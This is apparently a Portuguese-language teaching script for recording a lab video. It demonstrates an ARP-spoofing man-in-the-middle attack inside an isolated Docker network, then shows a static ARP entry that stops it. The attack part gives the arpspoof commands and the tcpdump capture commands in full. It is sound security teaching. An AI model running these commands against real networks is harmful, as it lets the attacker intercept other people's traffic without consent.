# Roteiro 2 — Man-in-the-Middle via ARP Spoofing

Vídeo demonstrativo para a Aula 4 de RSSI (Laboratório Prático). Ambiente
100% isolado em Docker — nada aqui sai da sua máquina.

**Antes de gravar**, abra **dois terminais lado a lado**:
- **Terminal 1** — do lado do `atacante`
- **Terminal 2** — do lado da `vitima`

⚠️ **Aviso a repetir em voz alta no início do vídeo:** este laboratório roda
numa rede Docker isolada, sem saída pra internet nem pra rede real. Essas
técnicas só podem ser usadas contra máquinas suas, criadas por você, com
essa finalidade — nunca contra redes ou dispositivos de terceiros (no
Brasil, isso é crime pela Lei 12.737/2012).

---

## Parte 1 — Preparando o ambiente

Pule esta parte se as VMs já estão de pé.

```bash
cd roteiros/
docker build -t rssi-lab:kali -f Dockerfile.rssi-lab .
docker network create --driver bridge --subnet 10.10.10.0/24 rssi-labnet
docker run -dit --name vitima   --network rssi-labnet --ip 10.10.10.20 --cap-add=NET_ADMIN --cap-add=NET_RAW --sysctl net.ipv4.tcp_syncookies=0 rssi-lab:kali
docker run -dit --name atacante --network rssi-labnet --ip 10.10.10.10 --cap-add=NET_ADMIN --cap-add=NET_RAW rssi-lab:kali
docker exec vitima ping -c 2 10.10.10.10
```

🎬 **Fale:** "Duas máquinas na mesma rede isolada: vítima em 10.10.10.20,
atacante em 10.10.10.10. O 'gateway' dessa rede, 10.10.10.1, é o próprio
roteador virtual do Docker — é o alvo que o atacante vai se passar por."

---

## Parte 2 — A tabela ARP legítima, antes do ataque

**Terminal 2 (vitima):**
```bash
docker exec vitima ping -c 2 10.10.10.1
docker exec vitima arp -n
```

🎬 **Fale:** "Toda rede local usa uma tabela ARP pra traduzir IP em
endereço MAC — endereço físico da placa de rede, que vocês já viram no
1º semestre. Aqui está a entrada real do gateway, com o MAC verdadeiro."

📝 **Anote na tela o MAC que aparece aqui** (formato tipo `02:42:0a:0a:0a:01`)
— vamos precisar dele na Parte 5.

---

## Parte 3 — Iniciando a captura e o ARP spoofing

🎬 **Fale:** "Agora, do atacante, vamos mandar respostas ARP falsas pra
vítima, dizendo 'eu sou o gateway' — sem que a vítima perceba nada."

**Terminal 1 (atacante) — inicia a captura em segundo plano:**
```bash
docker exec -d atacante tcpdump -i eth0 -n icmp -w /tmp/captura.pcap
```

**Terminal 1 (atacante) — dispara o ARP spoofing por 20 segundos:**
```bash
docker exec atacante timeout 20 arpspoof -i eth0 -t 10.10.10.20 10.10.10.1
```

*(Deixe esse comando rodando — ele fica "martelando" respostas ARP falsas
até o timeout. Vá pro Terminal 2 enquanto isso continua no fundo.)*

---

## Parte 4 — Provando a interceptação

**Terminal 2 (vitima) — checa a tabela ARP de novo, com o ataque em andamento:**
```bash
docker exec vitima arp -n
```

🎬 **Fale:** "Reparem: o MAC associado ao gateway (10.10.10.1) mudou —
agora aponta pro atacante, não pro roteador de verdade."

**Terminal 2 (vitima) — gera tráfego, achando que fala direto com o gateway:**
```bash
docker exec vitima ping -c 3 10.10.10.1
```

**Terminal 1 (atacante) — depois que o `timeout` do arpspoof encerrar, mostra a captura:**
```bash
docker exec atacante tcpdump -r /tmp/captura.pcap -n
```

🎬 **Fale:** "Esse tráfego da vítima passou pelo atacante antes de
qualquer coisa — é exatamente o Man-in-the-Middle que vimos na Aula 3.
Numa rede real, se fosse HTTP sem criptografia, o atacante estaria lendo
tudo em texto puro; é por isso que HTTPS é a defesa mais importante."

---

## Parte 5 — A defesa: entrada ARP estática

🎬 **Fale:** "A defesa de laboratório pra isso é registrar manualmente o
MAC real do gateway como uma entrada ESTÁTICA, que não aceita ser
sobrescrita por respostas ARP falsas."

**Terminal 2 (vitima) — use o MAC que você anotou na Parte 2:**
```bash
docker exec vitima arp -s 10.10.10.1 <MAC_REAL_ANOTADO_NA_PARTE_2>
```

**Terminal 1 (atacante) — repete o ataque:**
```bash
docker exec atacante timeout 15 arpspoof -i eth0 -t 10.10.10.20 10.10.10.1
```

**Terminal 2 (vitima) — confere de novo:**
```bash
docker exec vitima arp -n
```

🎬 **Fale:** "Com a entrada estática, o MAC do gateway na vítima não
muda mais, mesmo com o ataque rodando — a defesa funcionou."

---

## Limpeza (só quando terminar TODAS as gravações do dia)

```bash
docker exec vitima arp -d 10.10.10.1   # remove a entrada estática de teste
docker rm -f vitima atacante
docker network rm rssi-labnet
```
